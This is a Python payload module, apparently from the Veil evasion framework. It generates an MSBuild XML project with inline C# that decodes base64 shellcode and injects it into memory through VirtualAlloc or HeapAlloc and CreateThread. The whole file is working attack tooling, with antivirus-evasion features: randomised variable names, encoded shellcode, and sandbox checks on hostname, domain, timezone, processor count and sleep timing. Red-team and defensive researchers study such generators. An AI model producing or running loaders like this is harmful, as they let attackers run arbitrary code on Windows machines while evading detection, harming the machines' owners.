"""

MSBuild C# inline shellcode injector using the VirtualAlloc()/CreateThread() pattern.
Uses basic variable renaming obfuscation.

Adapated from code from:
    http://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/
    https://github.com/Veil-Framework/Veil/blob/master/Tools/Evasion/payloads/cs/shellcode_inject/base64.py

Module built by @ConsciousHacker

"""

import base64
from Tools.Bypass.bypass_common import bypass_helpers  # pylint: disable=E0611,E0401
from Tools.Bypass.bypass_common import gamemaker  # pylint: disable=E0611,E0401
from Tools.Bypass.bypass_common import shellcode_help  # pylint: disable=E0611,E0401


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "msbuild"
        self.extension = "xml"
        self.rating = "Poor"
        self.description = "MSBuild C# VirtualAlloc method for inline shellcode injection"
        self.name = "MSBuild C# Flat Shellcode Injector"
        self.path = "msbuild/shellcode_inject/virtual"
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                    "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                    "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                    "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                    "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
                                    "USERNAME"       : ["X", "Optional: The required user account"],
                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                }

    def generate(self):

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode
        Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])
        Shellcode = base64.b64encode(bytes(Shellcode, 'latin-1')).decode('ascii')

        # randomize all our variable names, yo'
        targetName = bypass_helpers.randomString()
        namespaceName = bypass_helpers.randomString()
        className = bypass_helpers.randomString()
        bytearrayName = bypass_helpers.randomString()
        funcAddrName = bypass_helpers.randomString()
        shellcodeName = bypass_helpers.randomString()
        hThreadName = bypass_helpers.randomString()
        threadIdName = bypass_helpers.randomString()
        pinfoName = bypass_helpers.randomString()
        num_tabs_required = 0

        # get 12 random variables for the API imports
        r = [bypass_helpers.randomString() for x in range(12)]
        y = [bypass_helpers.randomString() for x in range(17)]

        # The header for MSBuild XML files
        # TODO: Fix the awful formatting
        msbuild_header = """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n<!-- C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe SimpleTasks.csproj -->\n\t<Target Name="{0}">
            <{1} />
          </Target>
          <UsingTask
            TaskName="{1}"
            TaskFactory="CodeTaskFactory"
            AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
            <Task>

              <Code Type="Class" Language="cs">
              <![CDATA[
        """.format(targetName, className)

        #required syntax at the beginning of any/all payloads
        payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n"
        payload_code += "public class %s : Task, ITask {\n" % (className)
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])

        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2
        num_tabs_required += 2

        payload_code += '\t' * num_tabs_required + "string %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(\"%s\"));\n" % (bytearrayName, Shellcode)
        payload_code += '\t' * num_tabs_required + "string[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
        payload_code += '\t' * num_tabs_required + "byte[] %s = new byte[chars.Length];\n" %(shellcodeName)
        payload_code += '\t' * num_tabs_required + "for (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += '\t' * num_tabs_required + "UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" % (funcAddrName, shellcodeName)
            payload_code += '\t' * num_tabs_required + "Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" % (shellcodeName, funcAddrName, shellcodeName)
            payload_code += '\t' * num_tabs_required + "IntPtr %s = IntPtr.Zero; UInt32 %s = 0; IntPtr %s = IntPtr.Zero;\n" %(hThreadName, threadIdName, pinfoName)
            payload_code += '\t' * num_tabs_required + "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" % (hThreadName, funcAddrName, pinfoName, threadIdName)
            payload_code += '\t' * num_tabs_required + "WaitForSingleObject(%s, 0xFFFFFFFF);\n" % (hThreadName)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":

            rand_heap = bypass_helpers.randomString()
            rand_ptr = bypass_helpers.randomString()
            rand_var = bypass_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(rand_heap, shellcodeName)
            payload_code += '\t' * num_tabs_required + 'UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(rand_ptr, rand_heap, shellcodeName)
            payload_code += '\t' * num_tabs_required + 'RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(rand_ptr, shellcodeName, shellcodeName)
            payload_code += '\t' * num_tabs_required + 'UInt32 {} = 0;\n'.format(rand_var)
            payload_code += '\t' * num_tabs_required + 'IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, rand_ptr, rand_var)
            payload_code += '\t' * num_tabs_required + 'WaitForSingleObject({}, 0xFFFFFFFF);\n'.format(hThreadName)

        while (num_tabs_required != 0):
            if num_tabs_required == 2:
                # return true for the msbuild Execute() function
                payload_code += "\nreturn true;"
                payload_code += '\t' * num_tabs_required + '}'
                num_tabs_required -= 1
            else:
                payload_code += '\t' * num_tabs_required + '}'
                num_tabs_required -= 1

        payload_code += "\n\t\t\t\t]]>\n\t\t\t</Code>\n\t\t</Task>\n\t</UsingTask>\n</Project>"
        payload_code = msbuild_header + payload_code

        self.payload_source_code = payload_code
        return
